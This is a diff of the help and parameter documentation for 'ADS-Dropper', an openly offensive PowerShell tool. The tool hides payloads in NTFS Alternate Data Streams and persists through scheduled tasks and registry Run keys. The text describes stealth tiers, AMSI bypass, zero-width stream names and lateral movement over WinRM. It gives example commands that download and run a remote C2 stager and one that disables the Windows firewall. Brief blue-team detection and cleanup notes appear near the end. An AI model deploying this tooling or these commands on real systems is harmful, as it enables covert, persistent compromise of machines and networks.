@@ -1,55 +1,122 @@
 <#
-.DESCRIPTION ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry Run Keys).
-Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.
-Includes DPAPI machine-bound encryption, randomization, and privilege adaptation.
-.PARAMETER Payload [REQUIRED] The payload to deploy. Accepts: - String: PowerShell command or script - Array: File path to payload script (e.g., @('payload.ps1'))
-Examples:
-  "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
-  @('C:\payloads\imix_stager.ps1')
-  "Write-Output 'Beacon' | Out-File C:\beacon.log -Append"
-.PARAMETER Targets Target hosts for deployment. Default: @('localhost')
-- 'localhost' = Local deployment
-- Remote IPs/hostnames = Lateral movement via WinRM (requires -Credential)
+.DESCRIPTION
+    ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes
+    them via JScript wrappers (zero visible PowerShell window), and persists through
+    Scheduled Tasks or Registry Run Keys.
 
-Examples:
-  -Targets @('localhost')
-  -Targets @('10.10.10.50', 'dc01.corp.local')
-.PARAMETER Persist Persistence method. Default: 'task'
-Available methods:
-  task     - Scheduled Task (requires admin, logon + startup + periodic triggers)
-  registry - Registry Run key (works as user or admin, companion task for periodic)
-  none     - No persistence (ADS only)
+    Supports any C2 framework (Realm, Metasploit, Sliver) or custom PowerShell commands.
+    Includes DPAPI machine-bound encryption, four stealth tiers (-Obfuscate), deep
+    placement in WER/Cache directories, and dual-layer AMSI bypass.
 
-Examples:
-  -Persist task
-  -Persist registry
-.PARAMETER Randomize Enable randomization for evasion: - Random file/stream names (mimics legitimate Windows ADS) - Random loader names (app_log_*.vbs/ps1) - Random task names (GUIDs)
-Breaks signature-based detection but makes cleanup harder.
+    Typical workflow: Run ADS-OneLiner.ps1 on Kali to generate a one-liner, paste on
+    the Windows target. Use ADS-Dropper.ps1 directly only for local or lateral deployments.
 
-Example:
-  -Randomize
-.PARAMETER Encrypt Enable DPAPI machine-bound encryption of payload in ADS.
-- Uses Windows DPAPI (LocalMachine scope) + Machine GUID as entropy
-- Machine-bound: any process on the same machine (including SYSTEM) can decrypt
-- Copy to another machine = cannot decrypt (same binding guarantee as before)
-- Payload stored as Base64-encoded DPAPI blob
+.PARAMETER Payload
+    [REQUIRED unless -PayloadAtRuntime] The payload to deploy.
+    Accepts a PowerShell command string or a file path array: @('payload.ps1')
 
-Example:
-  -Encrypt
-.PARAMETER NoExec Stage artifacts (ADS, loader, persistence) WITHOUT executing.
-Use for:
-- Pre-staging during recon phase
-- Testing deployment without triggering C2 callbacks
-- Verifying artifacts before execution
+    Examples:
+      "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
+      @('C:\payloads\imix_stager.ps1')
+      'Write-Output Beacon | Out-File C:\beacon.log -Append'
 
-Example:
-  -NoExec
-.PARAMETER Credential PSCredential for remote deployment (WinRM authentication).
-Required when -Targets includes remote hosts.
+.PARAMETER PayloadAtRuntime
+    Prompt for payload interactively at deployment time instead of baking it in.
 
-Example:
-  -Credential (Get-Credential)
-.EXAMPLE # Basic local deployment (unencrypted, scheduled task) .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
+.PARAMETER Targets
+    Target hosts for deployment. Default: @('localhost')
+    Remote IPs/hostnames use WinRM (requires -Credential).
+
+    Examples:
+      -Targets @('localhost')
+      -Targets @('10.10.10.50', 'dc01.corp.local')
+
+.PARAMETER Persist
+    Persistence method. Default: 'task'
+      task     - Scheduled Task (admin required). AtLogOn + AtStartup + periodic triggers.
+      registry - Registry Run key (user or admin). HKCU + HKLM if admin. Companion task
+                 handles periodic firing.
+      none     - No persistence. ADS only, one-shot execution.
+
+.PARAMETER Obfuscate
+    Stealth tier. Controls artifact naming, file placement, and stream naming. Default: Advanced
+      None     - Fixed names (SystemOptimization task, SystemCache.dat file). Testing only.
+      Basic    - Word-list randomized names, C:\ProgramData placement. Quick deployment.
+      Advanced - Randomized names + deep WER/Cache placement + attach-to-existing. [DEFAULT]
+      Paranoid - Advanced + zero-width Unicode in stream/task names. Max stealth.
+
+    Implied settings per tier:
+      Advanced/Paranoid: Randomize=$true, UseDeepPlacement=$true, AttachToExisting=$true
+      Paranoid only:     ZeroWidthStreams=$true
+
+.PARAMETER Trigger
+    When the scheduled task fires. Accepts multiple values. Default: @('AtLogOn','AtStartup')
+    Valid values: AtLogOn, AtStartup, OnIdle, OnUnlock
+    A periodic task (every -PeriodicMinutes minutes) is ALWAYS added regardless of this setting.
+
+    Example: -Trigger @('AtLogOn','AtStartup','OnUnlock')
+
+.PARAMETER PeriodicMinutes
+    How often the periodic task fires, in minutes. Range: 1-1440. Default: 5
+
+.PARAMETER JitterPercent
+    Randomize task timing by +/- this percentage of the interval. Range: 0-50. Default: 20
+    Breaks pattern-based detection. Example: 20% of 5min = +/-1min actual fire time.
+
+.PARAMETER Randomize
+    Randomize artifact names (file, stream, task). Implied by Advanced/Paranoid tier.
+    Use explicitly to override tier behavior.
+
+.PARAMETER Encrypt
+    DPAPI machine-bound encrypt the payload in the ADS. Uses LocalMachine scope +
+    Machine GUID as additional entropy. Machine-bound: decrypts on the same machine only.
+    Payload stored as Base64-encoded DPAPI blob. No AES/SHA256 in output.
+
+.PARAMETER UseDeepPlacement
+    Place ADS host file in deep system directories (WER\Cache, Diagnosis\scheduled, etc.)
+    rather than C:\ProgramData root. Implied by Advanced/Paranoid tier.
+
+.PARAMETER AttachToExisting
+    Attach ADS to an existing legitimate system file instead of creating a new host file.
+    Implied by Advanced/Paranoid tier.
+
+.PARAMETER ZeroWidthStreams
+    Use zero-width Unicode characters (U+200B, U+200C, U+FEFF) in ADS stream names.
+    Stream names appear blank in most tools. Implied by Paranoid tier.
+    IMPORTANT: Save the manifest — you cannot type zero-width chars manually for cleanup.
+
+.PARAMETER ZeroWidthMode
+    How zero-width characters are applied to the stream name. Default: 'single'
+      single  - One zero-width char
+      multi   - 3-5 zero-width chars
+      hybrid  - Visible prefix + zero-width suffix (e.g., Zone.Identifier[ZW])
+
+.PARAMETER HybridPrefix
+    Visible prefix for hybrid ZeroWidthMode (e.g., 'Zone.Identifier', 'Summary').
+
+.PARAMETER CreateDecoys
+    Create N additional benign decoy ADS streams (Zone.Identifier, Summary, etc.)
+    alongside the real payload. Range: 0-10. Default: 0
+
+.PARAMETER ManifestPath
+    Path to save the deployment manifest (JSON). Records all artifact paths, task names,
+    stream codepoints for cleanup. Default: auto-generated in current directory.
+
+.PARAMETER NoExec
+    Stage all artifacts (ADS, JScript, task/registry) without executing.
+    Use for pre-staging or testing without triggering C2 callbacks.
+
+.PARAMETER Credential
+    PSCredential for remote deployment via WinRM. Required when -Targets includes remote hosts.
+    Example: -Credential (Get-Credential)
+
+.PARAMETER GenerateOnly
+    Generate the deployment configuration object and print it, without creating any artifacts.
+    Used by ADS-OneLiner.ps1 to read configuration on Linux.
+
+.EXAMPLE
+    # Basic local deployment (unencrypted, scheduled task)
+    .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
 Description:
 Stores payload in C:\ProgramData\SystemCache.dat:syc_payload
 Creates VBScript loader at C:\ProgramData\app_log_a.vbs
@@ -189,98 +256,107 @@ param(
 function Show-Help {
     $helpText = @"
 ===============================================================================
-  ADS-Dropper v2.4 - Quick Reference
+  ADS-Dropper v2.4 — Quick Reference
+  "Execution without presence"
 ===============================================================================
-USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]
+USAGE: .\ADS-Dropper.ps1 -Payload <cmd> [OPTIONS]
+       .\ADS-Dropper.ps1 -Help
 
-REQUIRED:
-  -Payload <string|array>   Payload to deploy (command or @('file.ps1'))
+--- WHAT DO I TYPE? (three canonical examples) --------------------------------
 
-OPTIONAL:
+  Fastest (local, Advanced stealth, task persistence):
+    .\ADS-Dropper.ps1 -Payload 'cmd /c netsh advfirewall set allprofiles state off'
+
+  Standard recommended (Advanced tier, encrypted, multi-trigger):
+    .\ADS-Dropper.ps1 -Payload `$payload -Obfuscate Advanced -Encrypt -Persist task ``
+      -Trigger @('AtLogOn','AtStartup','OnUnlock')
+
+  Lateral movement to remote hosts:
+    `$cred = Get-Credential
+    .\ADS-Dropper.ps1 -Payload `$payload -Targets @('dc01','web01') -Credential `$cred -Encrypt
+
+--- PAYLOAD INPUT -------------------------------------------------------------
+
+  -Payload <string>         PowerShell command string (required unless -PayloadAtRuntime)
+  -PayloadAtRuntime         Prompt for payload interactively at deployment time
+
+--- STEALTH TIER (the most important decision) --------------------------------
+
+  -Obfuscate <tier>         Controls naming, placement, stream naming. Default: Advanced
+
+    None     Fixed names (SystemOptimization task, SystemCache.dat).  [TESTING ONLY]
+    Basic    Word-list names, C:\ProgramData placement.               [Quick deployment]
+    Advanced Randomized names + WER/Cache deep placement.             [DEFAULT / CCDC]
+    Paranoid Advanced + zero-width Unicode stream/task names.         [Max stealth]
+
+  Tier-implied settings (Advanced/Paranoid imply these automatically):
+    Randomize=true, UseDeepPlacement=true, AttachToExisting=true
+    Paranoid also implies: ZeroWidthStreams=true
+
+--- PERSISTENCE ---------------------------------------------------------------
+
+  -Persist <method>         task | registry | none (default: task)
+  -Trigger <string[]>       AtLogOn, AtStartup, OnIdle, OnUnlock (default: AtLogOn+AtStartup)
+  -PeriodicMinutes <int>    Periodic task interval in minutes (default: 5, range: 1-1440)
+  -JitterPercent <int>      Timing jitter ±% of interval (default: 20, range: 0-50)
+
+  task     : Scheduled Task (admin required). JScript wrapper = zero visible PS window.
+             Fires on: configured triggers + periodic every N minutes.
+  registry : Registry Run key (user or admin). HKCU + HKLM if admin.
+             Companion scheduled task handles periodic + additional triggers.
+  none     : ADS only. One-shot execution, no re-trigger.
+
+--- EVASION ------------------------------------------------------------------
+
+  -Encrypt                  DPAPI machine-bound encrypt (LocalMachine scope + MachineGUID)
+  -Randomize <bool>         Randomize artifact names (implied by Advanced/Paranoid)
+  -UseDeepPlacement <bool>  Bury ADS in WER/Cache dirs (implied by Advanced/Paranoid)
+  -AttachToExisting <bool>  Attach to existing system file (implied by Advanced/Paranoid)
+  -NoExec                   Stage artifacts without executing (pre-staging / recon phase)
+
+--- STREAM NAMING ------------------------------------------------------------
+
+  -ZeroWidthStreams          Enable ZW Unicode chars in stream names (implied by Paranoid)
+  -ZeroWidthMode <mode>     single | multi | hybrid (default: single)
+  -HybridPrefix <string>    Visible prefix for hybrid mode (e.g., 'Zone.Identifier')
+  -CreateDecoys <int>       Add N benign decoy ADS streams alongside payload (0-10)
+
+--- REMOTE DEPLOYMENT --------------------------------------------------------
+
   -Targets <array>          Target hosts (default: @('localhost'))
-  -Persist <string>         Persistence method: task, registry, none
-  -Trigger <string[]>       Trigger types: AtLogOn, AtStartup, OnIdle, OnUnlock
-  -PeriodicMinutes <int>    Periodic interval in minutes (default: 5)
-  -JitterPercent <int>      Jitter percentage for timing (default: 20)
-  -Randomize                Randomize artifacts for evasion
-  -Encrypt                  DPAPI machine-bound encrypt payload
-  -NoExec                   Stage without executing
-  -Credential <PSCredential> Creds for remote deployment
+  -Credential <cred>        PSCredential for WinRM authentication
 
-QUICK START EXAMPLES:
-  Local deployment (basic)
-    .\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"
+--- OTHER --------------------------------------------------------------------
 
-  Full stealth (RECOMMENDED)
-    .\ADS-Dropper.ps1 -Payload $c2Stager -Encrypt -Randomize
+  -ManifestPath <path>      Where to save the cleanup manifest (JSON)
+  -GenerateOnly             Print configuration object without creating artifacts (Linux use)
+  -Help                     Show this help
 
-  Registry persistence
-    .\ADS-Dropper.ps1 -Payload $payload -Persist registry -Encrypt
+--- DETECTION & CLEANUP -------------------------------------------------------
 
-  Lateral movement
-    $cred = Get-Credential
-    .\ADS-Dropper.ps1 -Payload $payload -Targets @('dc01') -Credential $cred
+  Blue team detection vectors:
+    Sysmon Event 15     : ADS creation (FileCreateStreamHash)
+    Event ID 4698       : Scheduled task created
+    Event ID 4657       : Registry modification
+    PowerShell          : Get-ChildItem C:\ProgramData -Recurse | Get-Item -Stream *
 
-PERSISTENCE METHODS:
-  task      Scheduled Task (admin required)
-            Triggers: AtLogOn + AtStartup + periodic (configurable)
-            Cheeky triggers: OnIdle, OnUnlock
-            Path: \Microsoft\Windows\UX* or ...\UsbCeip
+  Cleanup:
+    Unregister-ScheduledTask -TaskName <name> -Confirm:$false
+    Remove-ItemProperty -Path HKCU:\...\Run -Name <name>
+    Remove-Item '<hostfile>:<streamname>' -Force
+    dir /r C:\ProgramData   # cmd: shows ADS sizes
 
-  registry  Registry Run Key (user or admin)
-            HKCU (AtLogOn) + HKLM if admin (AtStartup)
-            Companion task for periodic + cheeky triggers
-            Fallback to HKCU if not admin
+--- MORE INFO ----------------------------------------------------------------
 
-ENCRYPTION:
-  -Encrypt uses Windows DPAPI (LocalMachine scope + Machine GUID entropy)
-  Pros: Machine-bound, no AES/SHA256 in output (evades Defender on-access scan)
-  Cons: Requires PowerShell loader (more telemetry than VBScript)
+  Get-Help .\ADS-Dropper.ps1 -Full
+  Full parameter reference: see QUICK-START.md
+  Red team scenarios: see tests/RED-TEAM-SHOWCASE.md
 
-RANDOMIZATION:
-  -Randomize generates unique artifacts per deployment:
-    File:   SystemCache.dat -> CacheSvc.log
-    Stream: :syc_payload -> :SmartScreen or :Zone.Identifier
-    Loader: app_log_a.vbs -> app_log_kqmxyz.vbs
-    Task:   UsbCeip -> a3f5b2c1-... (GUID)
+  GitHub : https://github.com/Qweary/Apparition-Delivery-System
+  Blog   : https://qweary.github.io
 
-C2 FRAMEWORK EXAMPLES:
-  Realm C2 (Imix agent)
-    $imix = Get-Content .\imix_stager.txt -Raw
-    .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize
-
-  Metasploit
-    $msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")'
-    .\ADS-Dropper.ps1 -Payload $msf -Persist task
-
-  Sliver
-    $sliver = @('C:\payloads\sliver.ps1')
-    .\ADS-Dropper.ps1 -Payload $sliver -Encrypt
-
-DETECTION & CLEANUP:
-  Blue team detection:
-    - Sysmon Event ID 15 (ADS creation)
-    - Event ID 4698 (Task creation)
-    - Event ID 4657 (Registry modification)
-    - PowerShell: Get-ChildItem C:\ProgramData -Stream *
-  Cleanup artifacts: .\tests\cleanup.ps1 -Targets @('localhost')
-
-TESTING:
-  Validation suite: .\tests\validate.ps1
-  Manual verification:
-    dir /r C:\ProgramData           # Show ADS
-    schtasks /query /fo LIST         # Show tasks
-    reg query HKCU\...\Run          # Check registry
-
-MORE INFO:
-  Full help:    Get-Help .\ADS-Dropper.ps1 -Full
-  Examples:     Get-Help .\ADS-Dropper.ps1 -Examples
-  Parameters:   Get-Help .\ADS-Dropper.ps1 -Parameter *
-
-GitHub: https://github.com/Qweary/Apparition-Delivery-System
-Blog:   https://qweary.github.io
-
-ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
+  AUTHORIZED TESTING WITH EXPLICIT PERMISSION ONLY
+===============================================================================
 "@
     Write-Host $helpText -ForegroundColor Cyan
 }
